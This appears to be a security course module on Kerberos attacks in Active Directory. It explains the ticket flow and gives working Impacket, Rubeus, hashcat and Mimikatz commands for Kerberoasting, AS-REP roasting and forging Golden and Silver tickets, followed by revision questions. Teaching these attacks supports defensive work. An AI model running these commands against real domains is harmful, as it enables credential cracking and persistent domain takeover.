# Kerberos Attacks Overview

## Unit 6 - Topic 3 | Network Protocol Attacks

---

## Overview

**Kerberos** is the default authentication protocol in Active Directory (port 88). While designed for security, implementation weaknesses enable powerful attacks like Kerberoasting, AS-REP Roasting, Golden/Silver ticket attacks, and pass-the-ticket.

---

## 1. How Kerberos Works

```
KERBEROS AUTHENTICATION FLOW:

CLIENT              KDC (Domain Controller)          SERVICE
  │                       │                            │
  │  1. AS-REQ            │                            │
  │  "I am user1"         │                            │
  │──────────────────────→│                            │
  │                       │                            │
  │  2. AS-REP            │                            │
  │  TGT (encrypted       │                            │
  │   with krbtgt hash)   │                            │
  │←──────────────────────│                            │
  │                       │                            │
  │  3. TGS-REQ           │                            │
  │  "I need access to    │                            │
  │   SQL server" + TGT   │                            │
  │──────────────────────→│                            │
  │                       │                            │
  │  4. TGS-REP           │                            │
  │  Service Ticket (ST)  │                            │
  │  (encrypted with      │                            │
  │   service acct hash)  │                            │
  │←──────────────────────│                            │
  │                       │                            │
  │  5. AP-REQ            │                            │
  │  Present ST           │                            │
  │───────────────────────────────────────────────────→│
  │                       │                            │
  │  6. AP-REP            │                            │
  │  Access granted ✅     │                            │
  │←───────────────────────────────────────────────────│
```

---

## 2. Kerberoasting

```bash
# CONCEPT: Request service ticket → crack offline
# Service tickets are encrypted with the service account's hash
# If password is weak → crackable!

# === FIND KERBEROASTABLE ACCOUNTS ===
# Accounts with SPN (Service Principal Name) set:
GetUserSPNs.py corp.local/user:password -dc-ip dc01 -request

# === IMPACKET ===
impacket-GetUserSPNs corp.local/user:password \
  -dc-ip 10.10.10.1 -request -outputfile kerberoast_hashes.txt

# === RUBEUS (Windows) ===
Rubeus.exe kerberoast /outfile:hashes.txt

# === CRACK THE HASH ===
hashcat -m 13100 -a 0 kerberoast_hashes.txt rockyou.txt
# -m 13100: Kerberos 5 TGS-REP etype 23

john --format=krb5tgs kerberoast_hashes.txt --wordlist=rockyou.txt

# WHY IT WORKS:
# ├── Any domain user can request service tickets
# ├── Service ticket encrypted with service account's NTLM hash
# ├── Service accounts often have weak passwords
# ├── Cracking is offline — undetectable
# └── Service accounts often have high privileges
```

---

## 3. AS-REP Roasting

```bash
# CONCEPT: Accounts with "Do not require Kerberos pre-authentication"
# Can request AS-REP without knowing the password
# AS-REP contains hash encrypted with user's password

# === FIND VULNERABLE ACCOUNTS ===
GetNPUsers.py corp.local/ -dc-ip dc01 -usersfile users.txt \
  -format hashcat -outputfile asrep_hashes.txt

# No credentials needed! Just a user list:
GetNPUsers.py corp.local/ -dc-ip dc01 -no-pass \
  -usersfile users.txt -format hashcat

# === RUBEUS (Windows) ===
Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt

# === CRACK THE HASH ===
hashcat -m 18200 -a 0 asrep_hashes.txt rockyou.txt
# -m 18200: Kerberos 5 AS-REP etype 23

# WHY IT WORKS:
# ├── Pre-auth disabled — no password needed to get hash
# ├── Can enumerate without credentials
# ├── Offline cracking — no lockout
# └── Often forgotten accounts with weak passwords
```

---

## 4. Golden and Silver Tickets

```
GOLDEN TICKET:
├── Forge a TGT using the krbtgt hash
├── Requires: krbtgt NTLM hash (from NTDS.dit dump)
├── Result: Authenticate as ANY user (including non-existent)
├── Persistence: Valid until krbtgt password changed TWICE
└── Detection: Very difficult

SILVER TICKET:
├── Forge a service ticket using service account hash
├── Requires: Service account NTLM hash
├── Result: Access specific service without contacting DC
├── Persistence: Until service account password changes
└── Detection: No DC involved — harder to detect
```

```bash
# === GOLDEN TICKET (Impacket) ===
ticketer.py -nthash <krbtgt_hash> -domain-sid S-1-5-21-... \
  -domain corp.local Administrator

# === GOLDEN TICKET (Mimikatz) ===
kerberos::golden /user:Administrator /domain:corp.local \
  /sid:S-1-5-21-... /krbtgt:<hash> /ptt

# === SILVER TICKET (Mimikatz) ===
kerberos::golden /user:Administrator /domain:corp.local \
  /sid:S-1-5-21-... /target:sqlserver.corp.local \
  /service:MSSQLSvc /rc4:<service_hash> /ptt
```

---

## 5. Other Kerberos Attacks

| Attack | Description |
|--------|-------------|
| **Pass-the-Ticket** | Reuse stolen Kerberos tickets |
| **Overpass-the-Hash** | Use NTLM hash to get Kerberos ticket |
| **Unconstrained Delegation** | Steal TGTs from connecting users |
| **Constrained Delegation** | Abuse S4U extensions |
| **Diamond Ticket** | Modify legitimate TGT (stealthier than golden) |
| **Skeleton Key** | Patch LSASS — master password for all accounts |

---

## Summary Table

| Concept | Key Point |
|---------|-----------|
| **Kerberos** | Port 88 — AD authentication protocol |
| **Kerberoasting** | Crack service tickets offline (-m 13100) |
| **AS-REP Roasting** | No pre-auth → get hash without password |
| **Golden Ticket** | Forge TGT with krbtgt hash |
| **Silver Ticket** | Forge service ticket with service hash |
| **Defense** | Strong SPN passwords, enable pre-auth |

---

## Quick Revision Questions

1. **What is the difference between a TGT and a service ticket?**
2. **Why can any domain user perform Kerberoasting?**
3. **What account flag enables AS-REP Roasting?**
4. **What hash is needed to create a Golden Ticket?**
5. **How is a Silver Ticket different from a Golden Ticket?**

---

[← Previous: LDAP Enumeration](02-ldap-enumeration.md) | [Next: SNMP Exploitation →](04-snmp-exploitation.md)

---

*Unit 6 - Topic 3 of 6 | [Back to README](../README.md)*
